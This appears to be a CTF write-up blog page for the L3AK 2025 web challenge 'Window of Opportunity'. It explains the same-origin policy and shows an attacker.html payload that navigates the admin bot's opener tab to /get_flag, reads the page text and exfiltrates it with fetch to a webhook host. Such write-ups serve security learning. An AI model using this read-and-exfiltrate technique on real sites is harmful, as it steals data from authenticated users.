<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>L3AK25: Writeup for Web/Window-of-Opportunity | hxuu</title>
<meta name=keywords content="ctf,write-up,l3ak"><meta name=description content="CTF write-up for Window of Opportunity"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.a9de69711750554b5ca1926546c46a763ce30e0caa50cf5d86499b3b035e42bf.css integrity="sha256-qd5pcRdQVUtcoZJlRsRqdjzjDgyqUM9dhkmbOwNeQr8=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="L3AK25: Writeup for Web/Window-of-Opportunity"><meta property="og:description" content="CTF write-up for Window of Opportunity"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2025-07-14T09:31:33+01:00"><meta property="article:modified_time" content="2025-07-14T09:31:33+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="L3ak"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="L3AK25: Writeup for Web/Window-of-Opportunity"><meta name=twitter:description content="CTF write-up for Window of Opportunity"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"L3AK25: Writeup for Web/Window-of-Opportunity","item":"https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"L3AK25: Writeup for Web/Window-of-Opportunity","name":"L3AK25: Writeup for Web\/Window-of-Opportunity","description":"CTF write-up for Window of Opportunity","keywords":["ctf","write-up","l3ak"],"articleBody":"Challenge Overview CTF: L3AK CTF 2025 Challenge: Window of Opportunity Category: Web Exploitation Points: 68 (98 solves) Description: The admin bot loves opening URLs. I implemented CSRF protection, but it seems as though I’m forgetting something. Can you find the issue?\nAuthor: p._.k Challenge source (will update this when the ctf ends for reproducibility)\nTL;DR The challenge asks us to leak a flag from /get_flag, which is protected by CSRF tokens and Same-Origin Policy (SOP). However, the admin bot disables SOP using the --disable-web-security Chrome flag and opens our malicious page via window.open().\nThis gives our page a reference to the admin’s tab (window.opener), enabling us to exploit this by:\nNavigating the admin’s tab to /get_flag. Reading the flag from the DOM. Exfiltrating it to our server. This challenge demonstrates the dangers of window.opener in insecure browser configurations.\nInitial Analysis At first glance, this is clearly a CSRF challenge. Unlike XSS (which requires script injection into a trusted website), CSRF is about making an authenticated user (in this case, the admin bot) perform unintended actions that lead to (in our case) revealing the Flag.\nThe challenge doesn’t present much visually, so let’s dive into the source.\nProject structure . ├── Dockerfile ├── index.js ├── package.json ├── package-lock.json └── public ├── bg.jpg └── music.mp3 2 directories, 6 files Beyond the cool background (props to the author for the aesthetic) and music file, our main interest is index.js.\nindex.js ... const FLAG = process.env.FLAG || \"L3AK{t3mp_flag}\"; ... ... app.get('/get_flag', csrfProtection, (req, res) =\u003e { const token = req.cookies.token; if (!token) { return res.status(401).json({ error: 'Unauthorized: No token provided.' }); } try { const decoded = jwt.verify(token, COOKIE_SECRET); if (decoded.admin === true) { return res.json({ flag: FLAG, message: 'You opened the right door!' }); } else { return res.status(403).json({ error: 'Forbidden: You are not admin (-_-)' }); } } catch (err) { return res.status(401).json({ error: 'Unauthorized: Invalid token.' }); } }); To get the flag, we must send a request to get_flag and pass two checks:\nA valid admin JWT must be present. CSRF protection must be passed. Forging the JWT isn’t feasible — it’s signed server-side using a strong secret.\nThat leaves us with the CSRF logic:\nfunction csrfProtection(req, res, next) { const origin = req.headers.origin; const allowedOrigins = [ // Requests from these origins are probably safe `http://${HOST}:${PORT}`, `http://${REMOTE_IP}:${REMOTE_PORT}` ] if (req.path === '/') { return next(); } if (req.path === '/get_flag') { if(!req.headers.origin) { return next(); } } if (!origin || !allowedOrigins.includes(origin)) { return res.status(403).json({ error: 'Cross-origin request blocked', message: 'Origin not allowed' }); } let csrfToken = null; csrfToken = req.headers['x-csrf-token']; if (!csrfToken \u0026\u0026 req.headers.authorization) { const authHeader = req.headers.authorization; if (authHeader.startsWith('Bearer ')) { csrfToken = authHeader.substring(7); } } if (!csrfToken \u0026\u0026 req.body \u0026\u0026 req.body.csrf_token) { csrfToken = req.body.csrf_token; } if (!csrfToken \u0026\u0026 req.query.csrf_token) { csrfToken = req.query.csrf_token; } if (!validateCSRFToken(csrfToken)) { return res.status(403).json({ error: 'CSRF token validation failed', message: 'Invalid, missing, or expired CSRF token' }); } csrfTokens.delete(csrfToken); next(); } This middleware performs the following:\nOrigin checking (only accepts specific origins). Token validation (looks for a token in headers, body, or query params). Timestamp checking (must be recent, within 5 minutes). function validateCSRFToken(token) { if (!token || !csrfTokens.has(token)) { return false; } const timestamp = csrfTokens.get(token); const fiveMinutesAgo = Date.now() - (5 * 60 * 1000); if (timestamp \u003c fiveMinutesAgo) { csrfTokens.delete(token); return false; } return true; } Seems stronK huh!? We can’t easily spoof the Origin header, and even if can drop it, the check for its existence forbids us from doing anything further.\nThis leaves no option for hosting our own page and ourselves interacting with the server. The attack should be done from within, i.e. the admin, typical CSRF goal, but how can we achieve it?\nTask Analysis Digging deeper into the codebase, we hit the admin bot logic.\nOne line in particular stands out to me:\nconst args = [ ... \"--disable-web-security\", ... ]; This flag is passed to Puppeteer during browser initialization:\nbrowser = await puppeteer.launch({ headless: true, args }); This flag is normally meant for developers doing local testing and is not safe for anything else. But in CTF land? It’s a golden ticket.\nLet’s keep that in mind while we scroll down to how our input (the attacker URL) is processed:\nawait page.evaluate((targetUrl) =\u003e { window.open(targetUrl, \"_blank\"); }, url); Not using page.goto, but instead window.open(), mhmm.. Could this be important?\nThose two, I must add, key observations hinted at something to do with SOP in relation to opening windows, and since the web follows the composability principle, i.e. websites interacting with each other. I was wondering how browsers keeps them safe from one another, and whether this configuration might lead to vulnerabilities. Let’s see~\nIf you already know how the browsers apply the same origin policy, feel free to skip to the exploitation phase.\nThe Web Origin Concept User agents interact with different resources in the web. Those resources are served to the client for consumption and the latter might have confidential information the user agent does NOT want to disclose to other websites.\nFrom here, the concept of an origin comes out. In general, websites of the same origin are free to interact with each other, but cross-origin interaction is limited by the user agent in hopes that a malicious website doesn’t mess with the confidentiality or integrity of data of another (honest) website.\nHaving said that, we have to define what an origin is, as well as the principles of the same-origin policy.\nSome principles are application specific, the HTML spec being one example defining its own policy that follows the general principles laid out.\n1. Trust: user agents primarily perform two types of actions with remote servers:\nThe 1st is fetching data. The 2nd is sending data. Whether a trust relationship is established or not should be done using URIs, for example fetching data from http://example.com while in http://evil.com, the browser should compare the two URIs and dedice whether it trusts the other to do the action.\n2. Origin: In principle, user agents could treat every URI as a different protection domain, but that would be cumbersome for developers, because by default, http://example.com and http://example.com/login should interact freely. For this, two URIs are of the same origin if they have the same scheme, host and port. This way, user agents group origins under the same protection domain.\nBut does every resource in an origin group have the same authority?\n3. Authority: Here comes the third principle of authority, even though we share the same house (the origin), I, the owner (usually the html document) can do more stuff than you (a passive observer, usually img tags). This concept limits what resources can access in what domains. User agents apply this using media types so when user controlled content is thrown into an app, developers set their media type into image/png (if the content is an image), disallowing access to DOM APIs that could inflict damage.\n4. Policy: Generally speaking, and based on what’s said above, user agents isolate origins and permit controlled communication between them. This controlled communication depends on several factors:\nObject access: most objects (or APIs) are only accessed on the same origin, with the exception of HTML’s location interface (navigating other tabs), and the postmessage interface that allows the sending of data across origins. Network access: reading information from other origins is forbidden, unless cors is enabled (which in our case it isn’t). However, sending information to another origin is permitted. While sending is permitted across origins, using arbitrary formats is dangerous, thus browsers only allow the sending of data without custom headers (this proves the points made above about our inability to spoof the Origin header)\nTo recap: User agents serve different resources to us users. Those resources are grouped into origins, where interaction is free in same-origin, and controlled across origins.\nThis should make it clear that trying to READ the flag from our own malicious website isn’t feasible as it is, and trying to edit or craft custom headers to bypass the app protection isn’t feasible as well. So our only hope is navigating the admin (making sure you remember) to get the flag, and somehow get the response from him. Let’s check the navigation logic.\nThe Window interface When you launch your browser, you’re given a tab in which you put a url and navigate to it (wow, I bet you didn’t know that). On navigation, the browser sends a request to the server, the server usually responds with HTML and a document is created. This document is a javascript object that allows you to control the page by exposing different interfaces. One of these is the Window interface.\nThe Window interface represents a window containing a DOM document. You can use this interface to get the name of your tab (each tab is associated with a window object), get the current origin and even set the current url to a different web page, achieving the same effect as visually typing another url and hitting ENTER.\nAccording to the spec, when websites opens a url using window.open(), the opened window gets a reference to the opener window. In other words, if window A opens window B, B.opener returns A.\nThis is helpful because navigation of the opener window is possible, which means that the opened page can open a URL in the original tab or window NOT worrying about CSRF, because it’s the same origin!\nSo we can navigate the admin to /get_flag, but could we read the response?\nRevisiting --disable-web-security Flag normally, Windows opened by links with a target of _blank don’t get a reference to the opener, unless explicitly requested with rel=opener.\nThis is part of SOP. It makes sense that browsers do that by default. However, this challenge is not the usual, Using the --disable-web-security flag doesn’t enforce the same-origin policy. It’s meant for testing purposes only and should have no effects unless --user-data-dir is also present.\nLuckily for us, we have all the effects we need.\nExploitaiton Armed with this knowledge, we can exfiltrate the flag by hosting a malicious attacker.html page where:\nWe navigate the opener window that belongs to the admin to get the flag: window.opener.location = \"http://challenge/get_flag\"; Wait some time for the flag to load.\nGrab the flag and send it to our server:\nconst flagText = window.opener.document.body.innerText; fetch(\"https://webhook/?flag=\"+flagText); window.opener.document.body.innerText throws a DOMException unless origins match or SOP is disabled (which is our case with the –disable-web-security flag), so read is possible\nPutting everything together, we get the following\nattacker.html \u003c!DOCTYPE html\u003e \u003chtml\u003e \u003cbody\u003e \u003cscript\u003e // Redirect the original admin tab to /get_flag window.opener.location = \"http://challenge/get_flag\"; // Wait for admin's tab to load, then steal the flag setTimeout(() =\u003e { try { const flagText = window.opener.document.body.innerText; fetch(\"https://webhook/?flag=\"+flagText); } catch (err) { console.error(\"Failed to read flag:\", err); } }, 400); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e The code adheres to this visual representation of the attack:\nAdmin bot ↓ opens attacker.html Attacker tab → window.opener.location = /get_flag → waits... → reads window.opener.document.body.innerText → fetch('https://webhook.site?flag=...') We host the webpage and deliver the attack\nAnd Boom~\nHere is the flag: L3AK{T1gh7_CSRF_y3t_w1nd0w_0p3n3r_w1n5!}\nConclusions Same-Origin Policy (SOP) is a fundamental browser defense preventing cross-origin reads and DOM access. Browsers use origin tuples (scheme, host, port) to enforce this boundary. window.opener can be dangerous if the opened page is malicious and SOP is relaxed. The Chrome flag --disable-web-security completely disables SOP and CORS, making browser automation insecure by default. This challenge demonstrates how opener-based attacks can completely subvert origin boundaries in such an environment. CSRF protection alone is not enough when the browser itself disables security constraints. References Same-Origin Policy \u0026 Browser Security RFC 6454 – The Web Origin Concept (IETF) MDN – Same-Origin Policy Overview PortSwigger – Same-Origin Policy W3C Wiki – Same-Origin Policy (Archived) Peter Beverloo’s Chrome Switches – --disable-web-security Cross-Site Request Forgery (CSRF) PortSwigger – CSRF Overview PortSwigger – Bypassing Referer-Based CSRF Defenses Cookies, Metadata, and Headers web.dev – SameSite Cookies Explained MDN – Fetch Metadata Request Headers OWASP – XS-Leaks Cheat Sheet (Fetch Metadata) Browser APIs and Developer Guidance MDN – Window Interface MDN – document.body Chrome Developers – rel=noopener Best Practice ","wordCount":"2023","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2025-07-14T09:31:33+01:00","dateModified":"2025-07-14T09:31:33+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/l3ak25/window-of-opportunity/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">L3AK25: Writeup for Web/Window-of-Opportunity</h1><div class=post-description>CTF write-up for Window of Opportunity</div><div class=post-meta><span title='2025-07-14 09:31:33 +0100 +0100'>July 14, 2025</span>&nbsp;·&nbsp;10 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/l3ak25/window-of-opportunity.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-overview>Challenge Overview</a></li><li><a href=#tldr>TL;DR</a></li><li><a href=#initial-analysis>Initial Analysis</a><ul><li><a href=#project-structure>Project structure</a></li><li><a href=#indexjs><code>index.js</code></a></li></ul></li><li><a href=#task-analysis>Task Analysis</a><ul><li><a href=#the-web-origin-concept>The Web Origin Concept</a></li><li><a href=#the-window-interface>The Window interface</a></li><li><a href=#revisiting---disable-web-security-flag>Revisiting <code>--disable-web-security</code> Flag</a></li></ul></li><li><a href=#exploitaiton>Exploitaiton</a><ul><li><a href=#attackerhtml><code>attacker.html</code></a></li></ul></li><li><a href=#conclusions>Conclusions</a></li><li><a href=#references>References</a><ul><li><a href=#same-origin-policy--browser-security><strong>Same-Origin Policy & Browser Security</strong></a></li><li><a href=#cross-site-request-forgery-csrf><strong>Cross-Site Request Forgery (CSRF)</strong></a></li><li><a href=#cookies-metadata-and-headers><strong>Cookies, Metadata, and Headers</strong></a></li><li><a href=#browser-apis-and-developer-guidance><strong>Browser APIs and Developer Guidance</strong></a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-overview>Challenge Overview<a hidden class=anchor aria-hidden=true href=#challenge-overview>#</a></h2><ul><li>CTF: L3AK CTF 2025</li><li>Challenge: Window of Opportunity</li><li>Category: Web Exploitation</li><li>Points: 68 (98 solves)</li><li>Description:</li></ul><blockquote><p>The admin bot loves opening URLs. I implemented CSRF protection, but it seems as though I&rsquo;m forgetting something. Can you find the issue?</p></blockquote><p><img alt="challenge description" loading=lazy src=/blog/images/2025-07-16-21-42-14.png></p><ul><li>Author: <a href=https://discord.com/users/1267886144306282621>p._.k</a></li></ul><p><a href="https://ctf.l3ak.team/files/58130345fb4a47991e6e300c2e1d700f/Window_of_Opportunity.zip?token=eyJ1c2VyX2lkIjoyMjE0LCJ0ZWFtX2lkIjoxMDU5LCJmaWxlX2lkIjo4M30.aHgOmQ.BQUqPgdvlVETRHRpUBTPnRKgOeo">Challenge source (will update this when the ctf ends for reproducibility)</a></p><h2 id=tldr>TL;DR<a hidden class=anchor aria-hidden=true href=#tldr>#</a></h2><p>The challenge asks us to leak a flag from <code>/get_flag</code>, which is protected by CSRF tokens and Same-Origin Policy (SOP).
However, the admin bot disables SOP using the <code>--disable-web-security</code> Chrome flag and opens our malicious page via <code>window.open()</code>.</p><p>This gives our page a reference to the admin’s tab (<code>window.opener</code>), enabling us to exploit this by:</p><ol><li>Navigating the admin&rsquo;s tab to <code>/get_flag</code>.</li><li>Reading the flag from the DOM.</li><li>Exfiltrating it to our server.</li></ol><p>This challenge demonstrates the dangers of <code>window.opener</code> in insecure browser configurations.</p><h2 id=initial-analysis>Initial Analysis<a hidden class=anchor aria-hidden=true href=#initial-analysis>#</a></h2><p><img alt="Application showcase" loading=lazy src=/blog/images/l3ak25/window-of-opp-showcase.gif></p><p>At first glance, this is clearly a CSRF challenge. Unlike XSS (which requires script injection into a trusted website),
CSRF is about making an authenticated user (in this case, the admin bot) perform unintended actions that lead
to (in our case) revealing the Flag.</p><p>The challenge doesn’t present much visually, so let’s dive into the source.</p><h3 id=project-structure>Project structure<a hidden class=anchor aria-hidden=true href=#project-structure>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Dockerfile
</span></span><span class=line><span class=cl>├── index.js
</span></span><span class=line><span class=cl>├── package.json
</span></span><span class=line><span class=cl>├── package-lock.json
</span></span><span class=line><span class=cl>└── public
</span></span><span class=line><span class=cl>    ├── bg.jpg
</span></span><span class=line><span class=cl>    └── music.mp3
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=m>2</span> directories, <span class=m>6</span> files
</span></span></code></pre></div><p>Beyond the cool background (props to the author for the aesthetic) and music file, our main interest is <code>index.js</code>.</p><h3 id=indexjs><code>index.js</code><a hidden class=anchor aria-hidden=true href=#indexjs>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=kr>const</span> <span class=nx>FLAG</span> <span class=o>=</span> <span class=nx>process</span><span class=p>.</span><span class=nx>env</span><span class=p>.</span><span class=nx>FLAG</span> <span class=o>||</span> <span class=s2>&#34;L3AK{t3mp_flag}&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=nx>app</span><span class=p>.</span><span class=nx>get</span><span class=p>(</span><span class=s1>&#39;/get_flag&#39;</span><span class=p>,</span> <span class=nx>csrfProtection</span><span class=p>,</span> <span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>)</span> <span class=p>=&gt;</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>token</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>cookies</span><span class=p>.</span><span class=nx>token</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>token</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Unauthorized: No token provided.&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>try</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>decoded</span> <span class=o>=</span> <span class=nx>jwt</span><span class=p>.</span><span class=nx>verify</span><span class=p>(</span><span class=nx>token</span><span class=p>,</span> <span class=nx>COOKIE_SECRET</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>decoded</span><span class=p>.</span><span class=nx>admin</span> <span class=o>===</span> <span class=kc>true</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>json</span><span class=p>({</span> <span class=nx>flag</span><span class=o>:</span> <span class=nx>FLAG</span><span class=p>,</span> <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;You opened the right door!&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Forbidden: You are not admin (-_-)&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>err</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>401</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span> <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Unauthorized: Invalid token.&#39;</span> <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>});</span>
</span></span></code></pre></div><p>To get the flag, we must send a request to <code>get_flag</code> and pass two checks:</p><ol><li>A valid admin JWT must be present.</li><li>CSRF protection must be passed.</li></ol><p>Forging the JWT isn’t feasible — it’s signed server-side using a strong secret.</p><p>That leaves us with the CSRF logic:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-js data-lang=js><span class=line><span class=cl><span class=kd>function</span> <span class=nx>csrfProtection</span><span class=p>(</span><span class=nx>req</span><span class=p>,</span> <span class=nx>res</span><span class=p>,</span> <span class=nx>next</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>origin</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>origin</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kr>const</span> <span class=nx>allowedOrigins</span> <span class=o>=</span> <span class=p>[</span> <span class=c1>// Requests from these origins are probably safe
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=sb>`http://</span><span class=si>${</span><span class=nx>HOST</span><span class=si>}</span><span class=sb>:</span><span class=si>${</span><span class=nx>PORT</span><span class=si>}</span><span class=sb>`</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=sb>`http://</span><span class=si>${</span><span class=nx>REMOTE_IP</span><span class=si>}</span><span class=sb>:</span><span class=si>${</span><span class=nx>REMOTE_PORT</span><span class=si>}</span><span class=sb>`</span>
</span></span><span class=line><span class=cl>  <span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>path</span> <span class=o>===</span> <span class=s1>&#39;/&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=nx>req</span><span class=p>.</span><span class=nx>path</span> <span class=o>===</span> <span class=s1>&#39;/get_flag&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>origin</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=k>return</span> <span class=nx>next</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>origin</span> <span class=o>||</span> <span class=o>!</span><span class=nx>allowedOrigins</span><span class=p>.</span><span class=nx>includes</span><span class=p>(</span><span class=nx>origin</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>res</span><span class=p>.</span><span class=nx>status</span><span class=p>(</span><span class=mi>403</span><span class=p>).</span><span class=nx>json</span><span class=p>({</span>
</span></span><span class=line><span class=cl>      <span class=nx>error</span><span class=o>:</span> <span class=s1>&#39;Cross-origin request blocked&#39;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>      <span class=nx>message</span><span class=o>:</span> <span class=s1>&#39;Origin not allowed&#39;</span>
</span></span><span class=line><span class=cl>    <span class=p>});</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=kd>let</span> <span class=nx>csrfToken</span> <span class=o>=</span> <span class=kc>null</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=nx>csrfToken</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>[</span><span class=s1>&#39;x-csrf-token&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>csrfToken</span> <span class=o>&amp;&amp;</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>authorization</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kr>const</span> <span class=nx>authHeader</span> <span class=o>=</span> <span class=nx>req</span><span class=p>.</span><span class=nx>headers</span><span class=p>.</span><span class=nx>authorization</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>authHeader</span><span class=p>.</span><span class=nx>startsWith</span><span class=p>(</span><span class=s1>&#39;Bearer &#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nx>csrfToken</span> <span class=o>=</span> <span class=nx>authHeader</span><span class=p>.</span><span class=nx>substring</span><span class=p>(</span><span class=mi>7</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>csrfToken</span> <span class=o>&amp;&amp;</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span> <span class=o>&amp;&amp;</span> <span class=nx>req</span><span class=p>.</span><span class=nx>body</span><span class=p>.</span><span class=nx>csrf_token</span><span class=p>)</span> <span class=p>{</span>
